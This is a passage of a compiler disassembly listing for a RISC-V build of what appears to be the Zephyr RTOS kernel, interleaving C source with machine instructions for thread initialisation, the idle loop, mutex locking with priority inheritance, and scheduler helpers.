800049c0:	a0ffe0ef          	jal	ra,800033ce <arch_new_thread>
	new_thread->init_data = NULL;
800049c4:	06042423          	sw	zero,104(s0)
	new_thread->resource_pool = _current->resource_pool;
800049c8:	800097b7          	lui	a5,0x80009
800049cc:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800049d0:	479c                	lw	a5,8(a5)
800049d2:	0887a783          	lw	a5,136(a5)
800049d6:	08f42423          	sw	a5,136(s0)
}
800049da:	4732                	lw	a4,12(sp)
800049dc:	950ba783          	lw	a5,-1712(s7)
800049e0:	8fb9                	xor	a5,a5,a4
800049e2:	4701                	li	a4,0
800049e4:	ef89                	bnez	a5,800049fe <z_setup_new_thread+0x96>
800049e6:	854a                	mv	a0,s2
800049e8:	50f2                	lw	ra,60(sp)
800049ea:	5462                	lw	s0,56(sp)
800049ec:	54d2                	lw	s1,52(sp)
800049ee:	5942                	lw	s2,48(sp)
800049f0:	59b2                	lw	s3,44(sp)
800049f2:	5a22                	lw	s4,40(sp)
800049f4:	5a92                	lw	s5,36(sp)
800049f6:	5b02                	lw	s6,32(sp)
800049f8:	4bf2                	lw	s7,28(sp)
800049fa:	6121                	addi	sp,sp,64
800049fc:	8082                	ret
800049fe:	2f4010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004a02 <z_init_static_threads>:
{
80004a02:	7179                	addi	sp,sp,-48
80004a04:	d606                	sw	ra,44(sp)
80004a06:	d422                	sw	s0,40(sp)
80004a08:	8000c7b7          	lui	a5,0x8000c
80004a0c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004a10:	ce3a                	sw	a4,28(sp)
80004a12:	4701                	li	a4,0
	_FOREACH_STATIC_THREAD(thread_data) {
80004a14:	80007437          	lui	s0,0x80007
80004a18:	11440413          	addi	s0,s0,276 # 80007114 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007115>
80004a1c:	a025                	j	80004a44 <z_init_static_threads+0x42>
		z_setup_new_thread(
80004a1e:	545c                	lw	a5,44(s0)
80004a20:	c23e                	sw	a5,4(sp)
80004a22:	501c                	lw	a5,32(s0)
80004a24:	c03e                	sw	a5,0(sp)
80004a26:	01c42883          	lw	a7,28(s0)
80004a2a:	01842803          	lw	a6,24(s0)
80004a2e:	485c                	lw	a5,20(s0)
80004a30:	4818                	lw	a4,16(s0)
80004a32:	4454                	lw	a3,12(s0)
80004a34:	4410                	lw	a2,8(s0)
80004a36:	404c                	lw	a1,4(s0)
80004a38:	4008                	lw	a0,0(s0)
80004a3a:	373d                	jal	80004968 <z_setup_new_thread>
		thread_data->init_thread->init_data = thread_data;
80004a3c:	401c                	lw	a5,0(s0)
80004a3e:	d7a0                	sw	s0,104(a5)
	_FOREACH_STATIC_THREAD(thread_data) {
80004a40:	03040413          	addi	s0,s0,48
80004a44:	800077b7          	lui	a5,0x80007
80004a48:	11478793          	addi	a5,a5,276 # 80007114 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007115>
80004a4c:	fcf469e3          	bltu	s0,a5,80004a1e <z_init_static_threads+0x1c>
	k_sched_lock();
80004a50:	23bd                	jal	80004fbe <k_sched_lock>
	_FOREACH_STATIC_THREAD(thread_data) {
80004a52:	80007437          	lui	s0,0x80007
80004a56:	11440413          	addi	s0,s0,276 # 80007114 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007115>
80004a5a:	a085                	j	80004aba <z_init_static_threads+0xb8>
					    K_MSEC(thread_data->init_delay));
80004a5c:	41f7d713          	srai	a4,a5,0x1f
	 * the same mathematical relationship, each expressed with and
	 * without truncation to 32 bits (I couldn't find a way to make
	 * the compiler correctly guess at the 32 bit result otherwise).
	 */
	if (div_ratio) {
		t += off;
80004a60:	00978693          	addi	a3,a5,9
80004a64:	00f6b7b3          	sltu	a5,a3,a5
80004a68:	97ba                	add	a5,a5,a4
		if (result32 && (t < BIT64(32))) {
			return ((uint32_t)t) / (from_hz / to_hz);
		} else {
			return t / ((uint64_t)from_hz / to_hz);
80004a6a:	4601                	li	a2,0
80004a6c:	00f68733          	add	a4,a3,a5
80004a70:	06d76463          	bltu	a4,a3,80004ad8 <z_init_static_threads+0xd6>
80004a74:	9732                	add	a4,a4,a2
80004a76:	4615                	li	a2,5
80004a78:	02c77733          	remu	a4,a4,a2
80004a7c:	40e68733          	sub	a4,a3,a4
80004a80:	00e6b6b3          	sltu	a3,a3,a4
80004a84:	40d78633          	sub	a2,a5,a3
80004a88:	ccccd7b7          	lui	a5,0xccccd
80004a8c:	ccd78693          	addi	a3,a5,-819 # cccccccd <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xccccccce>
80004a90:	02d60633          	mul	a2,a2,a3
80004a94:	ccc78793          	addi	a5,a5,-820
80004a98:	02f707b3          	mul	a5,a4,a5
80004a9c:	963e                	add	a2,a2,a5
80004a9e:	02d707b3          	mul	a5,a4,a3
80004aa2:	02d73733          	mulhu	a4,a4,a3
80004aa6:	963a                	add	a2,a2,a4
80004aa8:	01f61593          	slli	a1,a2,0x1f
80004aac:	8385                	srli	a5,a5,0x1
			schedule_new_thread(thread_data->init_thread,
80004aae:	8ddd                	or	a1,a1,a5
80004ab0:	8205                	srli	a2,a2,0x1
80004ab2:	e2fff0ef          	jal	ra,800048e0 <schedule_new_thread>
	_FOREACH_STATIC_THREAD(thread_data) {
80004ab6:	03040413          	addi	s0,s0,48
80004aba:	800077b7          	lui	a5,0x80007
80004abe:	11478793          	addi	a5,a5,276 # 80007114 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007115>
80004ac2:	00f47d63          	bgeu	s0,a5,80004adc <z_init_static_threads+0xda>
		if (thread_data->init_delay != K_TICKS_FOREVER) {
80004ac6:	505c                	lw	a5,36(s0)
80004ac8:	577d                	li	a4,-1
80004aca:	fee786e3          	beq	a5,a4,80004ab6 <z_init_static_threads+0xb4>
			schedule_new_thread(thread_data->init_thread,
80004ace:	4008                	lw	a0,0(s0)
					    K_MSEC(thread_data->init_delay));
80004ad0:	f807d6e3          	bgez	a5,80004a5c <z_init_static_threads+0x5a>
80004ad4:	4781                	li	a5,0
80004ad6:	b759                	j	80004a5c <z_init_static_threads+0x5a>
80004ad8:	4605                	li	a2,1
80004ada:	bf69                	j	80004a74 <z_init_static_threads+0x72>
	k_sched_unlock();
80004adc:	771000ef          	jal	ra,80005a4c <k_sched_unlock>
}
80004ae0:	8000c7b7          	lui	a5,0x8000c
80004ae4:	4772                	lw	a4,28(sp)
80004ae6:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004aea:	8fb9                	xor	a5,a5,a4
80004aec:	4701                	li	a4,0
80004aee:	e789                	bnez	a5,80004af8 <z_init_static_threads+0xf6>
80004af0:	50b2                	lw	ra,44(sp)
80004af2:	5422                	lw	s0,40(sp)
80004af4:	6145                	addi	sp,sp,48
80004af6:	8082                	ret
80004af8:	1fa010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004afc <idle>:
#endif	/* CONFIG_PM */
	sys_clock_idle_exit();
}

void idle(void *unused1, void *unused2, void *unused3)
{
80004afc:	1101                	addi	sp,sp,-32
80004afe:	ce06                	sw	ra,28(sp)
80004b00:	8000c7b7          	lui	a5,0x8000c
80004b04:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004b08:	c63a                	sw	a4,12(sp)
80004b0a:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004b0c:	300477f3          	csrrci	a5,mstatus,8
 * @note In some architectures, before returning, the function unmasks interrupts
 * unconditionally.
 */
static inline void k_cpu_idle(void)
{
	arch_cpu_idle();
80004b10:	edafe0ef          	jal	ra,800031ea <arch_cpu_idle>
80004b14:	bfe5                	j	80004b0c <idle+0x10>

80004b16 <new_prio_for_inheritance>:
}
#include <syscalls/k_mutex_init_mrsh.c>
#endif

static int32_t new_prio_for_inheritance(int32_t target, int32_t limit)
{
80004b16:	1101                	addi	sp,sp,-32
80004b18:	ce06                	sw	ra,28(sp)
80004b1a:	8000c7b7          	lui	a5,0x8000c
80004b1e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004b22:	c63a                	sw	a4,12(sp)
80004b24:	4701                	li	a4,0
	int new_prio = z_is_prio_higher(target, limit) ? target : limit;
80004b26:	00b55363          	bge	a0,a1,80004b2c <new_prio_for_inheritance+0x16>
80004b2a:	85aa                	mv	a1,a0
	return prio >= CONFIG_PRIORITY_CEILING;
}

static inline int z_get_new_prio_with_ceiling(int prio)
{
	return z_is_under_prio_ceiling(prio) ? prio : CONFIG_PRIORITY_CEILING;
80004b2c:	f8100793          	li	a5,-127
80004b30:	00f5ce63          	blt	a1,a5,80004b4c <new_prio_for_inheritance+0x36>
80004b34:	852e                	mv	a0,a1

	new_prio = z_get_new_prio_with_ceiling(new_prio);

	return new_prio;
}
80004b36:	8000c7b7          	lui	a5,0x8000c
80004b3a:	4732                	lw	a4,12(sp)
80004b3c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004b40:	8fb9                	xor	a5,a5,a4
80004b42:	4701                	li	a4,0
80004b44:	e799                	bnez	a5,80004b52 <new_prio_for_inheritance+0x3c>
80004b46:	40f2                	lw	ra,28(sp)
80004b48:	6105                	addi	sp,sp,32
80004b4a:	8082                	ret
80004b4c:	f8100513          	li	a0,-127
	return new_prio;
80004b50:	b7dd                	j	80004b36 <new_prio_for_inheritance+0x20>
}
80004b52:	1a0010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004b56 <adjust_owner_prio>:

static bool adjust_owner_prio(struct k_mutex *mutex, int32_t new_prio)
{
80004b56:	1101                	addi	sp,sp,-32
80004b58:	ce06                	sw	ra,28(sp)
80004b5a:	8000c7b7          	lui	a5,0x8000c
80004b5e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004b62:	c63a                	sw	a4,12(sp)
80004b64:	4701                	li	a4,0
	if (mutex->owner->base.prio != new_prio) {
80004b66:	4508                	lw	a0,8(a0)
80004b68:	00e50783          	lb	a5,14(a0)
80004b6c:	00b79e63          	bne	a5,a1,80004b88 <adjust_owner_prio+0x32>
			'y' : 'n',
			new_prio, mutex->owner->base.prio);

		return z_set_prio(mutex->owner, new_prio);
	}
	return false;
80004b70:	4501                	li	a0,0
}
80004b72:	8000c7b7          	lui	a5,0x8000c
80004b76:	4732                	lw	a4,12(sp)
80004b78:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004b7c:	8fb9                	xor	a5,a5,a4
80004b7e:	4701                	li	a4,0
80004b80:	e799                	bnez	a5,80004b8e <adjust_owner_prio+0x38>
80004b82:	40f2                	lw	ra,28(sp)
80004b84:	6105                	addi	sp,sp,32
80004b86:	8082                	ret
		return z_set_prio(mutex->owner, new_prio);
80004b88:	5c3000ef          	jal	ra,8000594a <z_set_prio>
80004b8c:	b7dd                	j	80004b72 <adjust_owner_prio+0x1c>
}
80004b8e:	164010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004b92 <z_impl_k_mutex_lock>:

int z_impl_k_mutex_lock(struct k_mutex *mutex, k_timeout_t timeout)
{
80004b92:	7179                	addi	sp,sp,-48
80004b94:	d606                	sw	ra,44(sp)
80004b96:	d422                	sw	s0,40(sp)
80004b98:	d226                	sw	s1,36(sp)
80004b9a:	d04a                	sw	s2,32(sp)
80004b9c:	ce4e                	sw	s3,28(sp)
80004b9e:	cc52                	sw	s4,24(sp)
80004ba0:	842a                	mv	s0,a0
80004ba2:	8000c7b7          	lui	a5,0x8000c
80004ba6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004baa:	c63a                	sw	a4,12(sp)
80004bac:	4701                	li	a4,0
80004bae:	300474f3          	csrrci	s1,mstatus,8

	SYS_PORT_TRACING_OBJ_FUNC_ENTER(k_mutex, lock, mutex, timeout);

	key = k_spin_lock(&lock);

	if (likely((mutex->lock_count == 0U) || (mutex->owner == _current))) {
80004bb2:	455c                	lw	a5,12(a0)
80004bb4:	e7b1                	bnez	a5,80004c00 <z_impl_k_mutex_lock+0x6e>

		mutex->owner_orig_prio = (mutex->lock_count == 0U) ?
					_current->base.prio :
80004bb6:	efcd                	bnez	a5,80004c70 <z_impl_k_mutex_lock+0xde>
80004bb8:	80009737          	lui	a4,0x80009
80004bbc:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004bc0:	4718                	lw	a4,8(a4)
80004bc2:	00e70703          	lb	a4,14(a4)
		mutex->owner_orig_prio = (mutex->lock_count == 0U) ?
80004bc6:	c818                	sw	a4,16(s0)
					mutex->owner_orig_prio;

		mutex->lock_count++;
80004bc8:	0785                	addi	a5,a5,1
80004bca:	c45c                	sw	a5,12(s0)
		mutex->owner = _current;
80004bcc:	800097b7          	lui	a5,0x80009
80004bd0:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004bd4:	479c                	lw	a5,8(a5)
80004bd6:	c41c                	sw	a5,8(s0)
	__asm__ volatile ("csrs mstatus, %0"
80004bd8:	88a1                	andi	s1,s1,8
80004bda:	3004a073          	csrs	mstatus,s1

		k_spin_unlock(&lock, key);

		SYS_PORT_TRACING_OBJ_FUNC_EXIT(k_mutex, lock, mutex, timeout, 0);

		return 0;
80004bde:	4501                	li	a0,0
	}

	SYS_PORT_TRACING_OBJ_FUNC_EXIT(k_mutex, lock, mutex, timeout, -EAGAIN);

	return -EAGAIN;
}
80004be0:	8000c7b7          	lui	a5,0x8000c
80004be4:	4732                	lw	a4,12(sp)
80004be6:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004bea:	8fb9                	xor	a5,a5,a4
80004bec:	4701                	li	a4,0
80004bee:	ebcd                	bnez	a5,80004ca0 <z_impl_k_mutex_lock+0x10e>
80004bf0:	50b2                	lw	ra,44(sp)
80004bf2:	5422                	lw	s0,40(sp)
80004bf4:	5492                	lw	s1,36(sp)
80004bf6:	5902                	lw	s2,32(sp)
80004bf8:	49f2                	lw	s3,28(sp)
80004bfa:	4a62                	lw	s4,24(sp)
80004bfc:	6145                	addi	sp,sp,48
80004bfe:	8082                	ret
80004c00:	89ae                	mv	s3,a1
80004c02:	8932                	mv	s2,a2
	if (likely((mutex->lock_count == 0U) || (mutex->owner == _current))) {
80004c04:	4514                	lw	a3,8(a0)
80004c06:	80009737          	lui	a4,0x80009
80004c0a:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004c0e:	4718                	lw	a4,8(a4)
80004c10:	fae683e3          	beq	a3,a4,80004bb6 <z_impl_k_mutex_lock+0x24>
	if (unlikely(K_TIMEOUT_EQ(timeout, K_NO_WAIT))) {
80004c14:	00b667b3          	or	a5,a2,a1
80004c18:	cfb1                	beqz	a5,80004c74 <z_impl_k_mutex_lock+0xe2>
					    mutex->owner->base.prio);
80004c1a:	00e68a03          	lb	s4,14(a3)
	new_prio = new_prio_for_inheritance(_current->base.prio,
80004c1e:	85d2                	mv	a1,s4
80004c20:	00e70503          	lb	a0,14(a4)
80004c24:	3dcd                	jal	80004b16 <new_prio_for_inheritance>
	if (z_is_prio_higher(new_prio, mutex->owner->base.prio)) {
80004c26:	05454c63          	blt	a0,s4,80004c7e <z_impl_k_mutex_lock+0xec>
	bool resched = false;
80004c2a:	4a01                	li	s4,0
	int got_mutex = z_pend_curr(&lock, key, &mutex->wait_q, timeout);
80004c2c:	86ce                	mv	a3,s3
80004c2e:	874a                	mv	a4,s2
80004c30:	8622                	mv	a2,s0
80004c32:	85a6                	mv	a1,s1
80004c34:	80009537          	lui	a0,0x80009
80004c38:	54450513          	addi	a0,a0,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
80004c3c:	4bf000ef          	jal	ra,800058fa <z_pend_curr>
	if (got_mutex == 0) {
80004c40:	d145                	beqz	a0,80004be0 <z_impl_k_mutex_lock+0x4e>
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004c42:	300474f3          	csrrci	s1,mstatus,8
	if (likely(mutex->owner != NULL)) {
80004c46:	441c                	lw	a5,8(s0)
80004c48:	c3b1                	beqz	a5,80004c8c <z_impl_k_mutex_lock+0xfa>
 * @return true if empty, false otherwise
 */

static inline bool sys_dlist_is_empty(sys_dlist_t *list)
{
	return list->head == list;
80004c4a:	401c                	lw	a5,0(s0)
 * @return a pointer to the head element, NULL if list is empty
 */

static inline sys_dnode_t *sys_dlist_peek_head(sys_dlist_t *list)
{
	return sys_dlist_is_empty(list) ? NULL : list->head;
80004c4c:	02878e63          	beq	a5,s0,80004c88 <z_impl_k_mutex_lock+0xf6>
			new_prio_for_inheritance(waiter->base.prio, mutex->owner_orig_prio) :
80004c50:	cf85                	beqz	a5,80004c88 <z_impl_k_mutex_lock+0xf6>
80004c52:	480c                	lw	a1,16(s0)
80004c54:	00e78503          	lb	a0,14(a5)
80004c58:	3d7d                	jal	80004b16 <new_prio_for_inheritance>
80004c5a:	85aa                	mv	a1,a0
		resched = adjust_owner_prio(mutex, new_prio) || resched;
80004c5c:	8522                	mv	a0,s0
80004c5e:	3de5                	jal	80004b56 <adjust_owner_prio>
80004c60:	e905                	bnez	a0,80004c90 <z_impl_k_mutex_lock+0xfe>
80004c62:	020a1763          	bnez	s4,80004c90 <z_impl_k_mutex_lock+0xfe>
	__asm__ volatile ("csrs mstatus, %0"
80004c66:	88a1                	andi	s1,s1,8
80004c68:	3004a073          	csrs	mstatus,s1
	return -EAGAIN;
80004c6c:	5555                	li	a0,-11
80004c6e:	bf8d                	j	80004be0 <z_impl_k_mutex_lock+0x4e>
					_current->base.prio :
80004c70:	4818                	lw	a4,16(s0)
80004c72:	bf91                	j	80004bc6 <z_impl_k_mutex_lock+0x34>
80004c74:	88a1                	andi	s1,s1,8
80004c76:	3004a073          	csrs	mstatus,s1
		return -EBUSY;
80004c7a:	5541                	li	a0,-16
80004c7c:	b795                	j	80004be0 <z_impl_k_mutex_lock+0x4e>
		resched = adjust_owner_prio(mutex, new_prio);
80004c7e:	85aa                	mv	a1,a0
80004c80:	8522                	mv	a0,s0
80004c82:	3dd1                	jal	80004b56 <adjust_owner_prio>
80004c84:	8a2a                	mv	s4,a0
80004c86:	b75d                	j	80004c2c <z_impl_k_mutex_lock+0x9a>
			new_prio_for_inheritance(waiter->base.prio, mutex->owner_orig_prio) :
80004c88:	480c                	lw	a1,16(s0)
80004c8a:	bfc9                	j	80004c5c <z_impl_k_mutex_lock+0xca>
	if (resched) {
80004c8c:	fc0a0de3          	beqz	s4,80004c66 <z_impl_k_mutex_lock+0xd4>
		z_reschedule(&lock, key);
80004c90:	85a6                	mv	a1,s1
80004c92:	80009537          	lui	a0,0x80009
80004c96:	54450513          	addi	a0,a0,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
80004c9a:	2311                	jal	8000519e <z_reschedule>
	return -EAGAIN;
80004c9c:	5555                	li	a0,-11
80004c9e:	b789                	j	80004be0 <z_impl_k_mutex_lock+0x4e>
}
80004ca0:	052010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004ca4 <z_impl_k_mutex_unlock>:
}
#include <syscalls/k_mutex_lock_mrsh.c>
#endif

int z_impl_k_mutex_unlock(struct k_mutex *mutex)
{
80004ca4:	1101                	addi	sp,sp,-32
80004ca6:	ce06                	sw	ra,28(sp)
80004ca8:	cc22                	sw	s0,24(sp)
80004caa:	ca26                	sw	s1,20(sp)
80004cac:	8000c7b7          	lui	a5,0x8000c
80004cb0:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004cb4:	c63a                	sw	a4,12(sp)
80004cb6:	4701                	li	a4,0

	__ASSERT(!arch_is_in_isr(), "mutexes cannot be used inside ISRs");

	SYS_PORT_TRACING_OBJ_FUNC_ENTER(k_mutex, unlock, mutex);

	CHECKIF(mutex->owner == NULL) {
80004cb8:	4518                	lw	a4,8(a0)
80004cba:	cf2d                	beqz	a4,80004d34 <z_impl_k_mutex_unlock+0x90>
80004cbc:	842a                	mv	s0,a0
		return -EINVAL;
	}
	/*
	 * The current thread does not own the mutex.
	 */
	CHECKIF(mutex->owner != _current) {
80004cbe:	800097b7          	lui	a5,0x80009
80004cc2:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004cc6:	479c                	lw	a5,8(a5)
80004cc8:	06f71863          	bne	a4,a5,80004d38 <z_impl_k_mutex_unlock+0x94>

	/*
	 * If we are the owner and count is greater than 1, then decrement
	 * the count and return and keep current thread as the owner.
	 */
	if (mutex->lock_count > 1U) {
80004ccc:	455c                	lw	a5,12(a0)
80004cce:	4705                	li	a4,1
80004cd0:	02f77263          	bgeu	a4,a5,80004cf4 <z_impl_k_mutex_unlock+0x50>
		mutex->lock_count--;
80004cd4:	17fd                	addi	a5,a5,-1
80004cd6:	c55c                	sw	a5,12(a0)


k_mutex_unlock_return:
	SYS_PORT_TRACING_OBJ_FUNC_EXIT(k_mutex, unlock, mutex, 0);

	return 0;
80004cd8:	4501                	li	a0,0
}
80004cda:	8000c7b7          	lui	a5,0x8000c
80004cde:	4732                	lw	a4,12(sp)
80004ce0:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004ce4:	8fb9                	xor	a5,a5,a4
80004ce6:	4701                	li	a4,0
80004ce8:	ebb1                	bnez	a5,80004d3c <z_impl_k_mutex_unlock+0x98>
80004cea:	40f2                	lw	ra,28(sp)
80004cec:	4462                	lw	s0,24(sp)
80004cee:	44d2                	lw	s1,20(sp)
80004cf0:	6105                	addi	sp,sp,32
80004cf2:	8082                	ret
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004cf4:	300474f3          	csrrci	s1,mstatus,8
	adjust_owner_prio(mutex, mutex->owner_orig_prio);
80004cf8:	490c                	lw	a1,16(a0)
80004cfa:	e5dff0ef          	jal	ra,80004b56 <adjust_owner_prio>
	new_owner = z_unpend_first_thread(&mutex->wait_q);
80004cfe:	8522                	mv	a0,s0
80004d00:	63d000ef          	jal	ra,80005b3c <z_unpend_first_thread>
	mutex->owner = new_owner;
80004d04:	c408                	sw	a0,8(s0)
	if (new_owner != NULL) {
80004d06:	c105                	beqz	a0,80004d26 <z_impl_k_mutex_unlock+0x82>
		mutex->owner_orig_prio = new_owner->base.prio;
80004d08:	00e50783          	lb	a5,14(a0)
80004d0c:	c81c                	sw	a5,16(s0)
 * z_swap() is in use it's a simple inline provided by the kernel.
 */
static ALWAYS_INLINE void
arch_thread_return_value_set(struct k_thread *thread, unsigned int value)
{
	thread->swap_retval = value;
80004d0e:	08052023          	sw	zero,128(a0)
		z_ready_thread(new_owner);
80004d12:	0ff000ef          	jal	ra,80005610 <z_ready_thread>
		z_reschedule(&lock, key);
80004d16:	85a6                	mv	a1,s1
80004d18:	80009537          	lui	a0,0x80009
80004d1c:	54450513          	addi	a0,a0,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
80004d20:	29bd                	jal	8000519e <z_reschedule>
	return 0;
80004d22:	4501                	li	a0,0
80004d24:	bf5d                	j	80004cda <z_impl_k_mutex_unlock+0x36>
		mutex->lock_count = 0U;
80004d26:	00042623          	sw	zero,12(s0)
	__asm__ volatile ("csrs mstatus, %0"
80004d2a:	88a1                	andi	s1,s1,8
80004d2c:	3004a073          	csrs	mstatus,s1
	return 0;
80004d30:	4501                	li	a0,0
80004d32:	b765                	j	80004cda <z_impl_k_mutex_unlock+0x36>
		return -EINVAL;
80004d34:	5529                	li	a0,-22
80004d36:	b755                	j	80004cda <z_impl_k_mutex_unlock+0x36>
		return -EPERM;
80004d38:	557d                	li	a0,-1
80004d3a:	b745                	j	80004cda <z_impl_k_mutex_unlock+0x36>
}
80004d3c:	7b7000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004d40 <sliceable>:
	}
}
#endif

static inline bool sliceable(struct k_thread *thread)
{
80004d40:	1101                	addi	sp,sp,-32
80004d42:	ce06                	sw	ra,28(sp)
80004d44:	8000c7b7          	lui	a5,0x8000c
80004d48:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004d4c:	c63a                	sw	a4,12(sp)
80004d4e:	4701                	li	a4,0
	return thread->base.preempt <= _PREEMPT_THRESHOLD;
80004d50:	00e55703          	lhu	a4,14(a0)
	bool ret = is_preempt(thread)
		&& !z_is_thread_prevented_from_running(thread)
		&& !z_is_prio_higher(thread->base.prio, slice_max_prio)
		&& !z_is_idle_thread_object(thread);
80004d54:	07f00793          	li	a5,127
80004d58:	02e7e663          	bltu	a5,a4,80004d84 <sliceable+0x44>
	uint8_t state = thread->base.thread_state;
80004d5c:	00d54783          	lbu	a5,13(a0)
		&& !z_is_thread_prevented_from_running(thread)
80004d60:	8bfd                	andi	a5,a5,31
80004d62:	ef8d                	bnez	a5,80004d9c <sliceable+0x5c>
		&& !z_is_prio_higher(thread->base.prio, slice_max_prio)
80004d64:	00e50703          	lb	a4,14(a0)
80004d68:	800097b7          	lui	a5,0x80009
80004d6c:	0487a783          	lw	a5,72(a5) # 80009048 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009049>
80004d70:	02f74863          	blt	a4,a5,80004da0 <sliceable+0x60>
		&& !z_is_idle_thread_object(thread);
80004d74:	800097b7          	lui	a5,0x80009
80004d78:	19878793          	addi	a5,a5,408 # 80009198 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009199>
80004d7c:	02f50463          	beq	a0,a5,80004da4 <sliceable+0x64>
80004d80:	4505                	li	a0,1
80004d82:	a011                	j	80004d86 <sliceable+0x46>
80004d84:	4501                	li	a0,0
#ifdef CONFIG_TIMESLICE_PER_THREAD
	ret |= thread->base.slice_ticks != 0;
#endif

	return ret;
}
80004d86:	8000c7b7          	lui	a5,0x8000c
80004d8a:	4732                	lw	a4,12(sp)
80004d8c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004d90:	8fb9                	xor	a5,a5,a4
80004d92:	4701                	li	a4,0
80004d94:	eb91                	bnez	a5,80004da8 <sliceable+0x68>
80004d96:	40f2                	lw	ra,28(sp)
80004d98:	6105                	addi	sp,sp,32
80004d9a:	8082                	ret
		&& !z_is_idle_thread_object(thread);
80004d9c:	4501                	li	a0,0
80004d9e:	b7e5                	j	80004d86 <sliceable+0x46>
80004da0:	4501                	li	a0,0
80004da2:	b7d5                	j	80004d86 <sliceable+0x46>
80004da4:	4501                	li	a0,0
80004da6:	b7c5                	j	80004d86 <sliceable+0x46>
}
80004da8:	74b000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004dac <thread_active_elsewhere>:
	_current_cpu->swap_ok = preempt_ok;
#endif
}

static bool thread_active_elsewhere(struct k_thread *thread)
{
80004dac:	1101                	addi	sp,sp,-32
80004dae:	ce06                	sw	ra,28(sp)
80004db0:	8000c7b7          	lui	a5,0x8000c
80004db4:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004db8:	c63a                	sw	a4,12(sp)
80004dba:	4701                	li	a4,0
			return true;
		}
	}
#endif
	return false;
}
80004dbc:	4732                	lw	a4,12(sp)
80004dbe:	9507a783          	lw	a5,-1712(a5)
80004dc2:	8fb9                	xor	a5,a5,a4
80004dc4:	4701                	li	a4,0
80004dc6:	e789                	bnez	a5,80004dd0 <thread_active_elsewhere+0x24>
80004dc8:	4501                	li	a0,0
80004dca:	40f2                	lw	ra,28(sp)
80004dcc:	6105                	addi	sp,sp,32
80004dce:	8082                	ret
80004dd0:	723000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004dd4 <pended_on_thread>:
}
#include <syscalls/k_thread_resume_mrsh.c>
#endif

static _wait_q_t *pended_on_thread(struct k_thread *thread)
{
80004dd4:	1101                	addi	sp,sp,-32
80004dd6:	ce06                	sw	ra,28(sp)
80004dd8:	8000c7b7          	lui	a5,0x8000c
80004ddc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004de0:	c63a                	sw	a4,12(sp)
80004de2:	4701                	li	a4,0
	__ASSERT_NO_MSG(thread->base.pended_on);

	return thread->base.pended_on;
80004de4:	4508                	lw	a0,8(a0)
}
80004de6:	4732                	lw	a4,12(sp)
80004de8:	9507a783          	lw	a5,-1712(a5)
80004dec:	8fb9                	xor	a5,a5,a4
80004dee:	4701                	li	a4,0
80004df0:	e781                	bnez	a5,80004df8 <pended_on_thread+0x24>
80004df2:	40f2                	lw	ra,28(sp)
80004df4:	6105                	addi	sp,sp,32
80004df6:	8082                	ret
80004df8:	6fb000ef          	jal	ra,80005cf2 <_StackCheckHandler>

